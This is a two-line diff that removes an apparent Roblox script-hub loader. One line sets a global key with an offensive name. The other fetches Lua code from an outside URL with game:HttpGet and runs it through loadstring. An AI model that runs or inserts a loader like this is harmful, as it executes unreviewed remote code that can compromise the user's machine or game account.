@@ -1,2 +1,0 @@
-getgenv().key = "BackToRacistKeysWOOOOOOOOOO";
-loadstring(game:HttpGet("https://versus-airlines.cf/scripts/loader.lua"))()
